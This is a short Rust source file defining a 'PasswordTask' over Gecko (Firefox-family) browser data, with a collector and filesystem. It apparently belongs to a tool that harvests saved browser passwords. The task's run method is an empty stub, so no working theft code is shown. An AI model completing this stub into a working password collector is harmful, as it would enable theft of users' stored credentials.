use alloc::sync::Arc;
use derive_new::new;
use collector::Collector;
use filesystem::FileSystem;
use filesystem::path::Path;
use tasks::Task;
use crate::gecko::GeckoBrowserData;

#[derive(new)]
pub(super) struct PasswordTask<'a> {
    browser: Arc<GeckoBrowserData<'a>>,
}

impl<C: Collector, F: FileSystem> Task<C, F> for PasswordTask<'_> {
    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
    }
}
